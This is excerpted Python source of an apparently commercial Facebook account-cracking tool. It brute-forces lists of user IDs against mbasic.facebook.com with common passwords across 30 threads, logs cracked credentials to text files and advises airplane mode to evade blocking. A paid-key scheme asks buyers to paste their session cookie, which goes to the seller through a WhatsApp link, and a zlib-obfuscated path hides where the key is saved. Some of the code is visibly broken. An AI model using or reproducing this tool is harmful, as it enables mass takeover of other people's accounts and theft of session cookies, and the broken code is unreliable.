...
from concurrent.futures import ThreadPoolExecutor as mdrejaul
...
def main_apv():
    ...
    r1=requests.get("https://pastebin.com/raw/qqZgMt2n").text
    if key1 in r1:
        rakib()
    else:
        os.system("clear")
...
\033[1;92m║ [âˆš] \033[1;92mGITHUB      :    BlackTiger-404   ║
\033[1;92m║ [âˆš] \033[1;92mTOOLS       :    FILE  CLONING    ║
\033[1;92m╚═════════════════════════════════════════╝"""                                              
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n \x1b[1;92mTOTAL OK : \x1b[1;92m %s  \x1b[1;92mREJAUL_OK.txt' % (H, P, str(len(ok))))
	    print(' \x1b[1;91mTOTAL CP :\x1b[1;91m   %s \x1b[1;91mREJAUL_CP.txt' % (H, P, str(len(cp))))
...
def rakib():
    ...
    #print(' \x1b[1;92m[2] PUBLIC CLONE')
    print(' \x1b[1;92m[2] UNLIMITED FILE MAKING')
    #print(' [4] FACEBOOK GROUP')
    print(' [W] WHATSAPP OWNER ')
    print(' [F] FACEBOOK OWNER ')
   # print(' [Y] YOUTUBE CHANNEL ')
    print(' [E] EXIT ')
    print('')
    _rakib___ = input(' [✓] CHOSE : ')
    if _rakib___ in ('1', '01'):
        __xxx__().rakibx(id)
    if _hamii___ in ('2','02'):
        os.system('python3 rejaul.py')
    if _rakib___ in ('3','03'):
        os.system('python3 Unlimited-Dump.py')
    if _rakib___ in ('4','04'):
        os.system('xdg-open https://facebook.com/groups/492909121746564/')
    if _rakib___ in ('W', 'w'):
        os.system('xdg-open https://wa.me/01716813379')
    if _rakib___ in ('F','f'):
        os.system('xdg-open https://www.facebook.com/raeesah.r.abbu')
    if _rakib___ in ('Y', 'y'):
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;96m[RNL] {loop}|{len(self.id)} [OK][{len(ok)}] [CP][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H}[REJAUL-OK] {user} | {pw}")
                    wrt = '%s | %s' % (user,pw)
                    ok.append(wrt)
                    open('REJAUL_CP.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s[REJAUL-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s | %s' % (user,pw)
                        cp.append(wrt)
                        open('REJAUL_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def __pler__(self):
        print('[1] CRACK WITH AUTO PASS (V1) Fast ')
        ...
        if chi == '':
            ...
            print("\033[1;91m\rUSE FLIGHT (airplane) MODE ON\033[1;92m")
            
            print(61*"━")
            print('\033[1;92mTOTAL IDS : %s ' % len(self.id))
            print('\033[1;397mCRACKING STARTED.....')
            print(61*"━")
            with mdrejaul(max_workers=30) as rejaulworld:
                for zsb in self.id:
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = ["Bangladesh"]
                            pwx = ["123456"]
                        rejaulworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('2', '02'):
            ...
            print(61*"━")
            print('\033[1;92mTOTAL IDS : %s ' % len(self.id))
            print('\033[1;97mCRACKING STARTED.....')
            print(61*"━")
            with mdrejaul(max_workers=30) as rejaulworld:
                for zsb in self.id:
                    try:
...
def bnsbuy():
    ...
    if to in r:
        ...
        print
        print('\rjazzcash Account Number 01620125579\n')
        ...
        print ('\n')
        ss = input('\rPaste Here your Cookie:')
        print('\n')
        ...
        os.system('am start https://wa.me/++8801716813329?text=' + tks)
...
def bnsreg():
    ...
    print
    id = str(uuid.uuid1(uuid.getnode(),0))[24:].upper() + "~RNL=="
    print
    print ('\n\x1b[1;97m Your Token: \x1b[97m' + id + '\n')
    print
    print('\rTool Price 350rs\n')
    print
    print('\rjazzcash Account Number 0 1620125579\n')
    print('\rAccount Name Nazeer Ahmed\n')
    print
    print('\rPayment Successfully Msg Or Token Send\n')
    print
    ...
    tks = 'Hello%20Admin%20Approval%20my%20key.%20payment%20Done,%20%20Information%20:-%20%20%20Track%20Msg%20:%20%20'+sb+'%20Token%20:%20'+ss
    os.system('am start https://wa.me/++880 1620-125579?text=' + tks)
    f = (b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfa\xa9%\xc9\xfa\x10\xc1\xa4\xcc<\x00}\x1e\x11\x17')
    bd = (zlib.decompress(f))
    sav = open(bd, 'w') 
    sav.write(id)
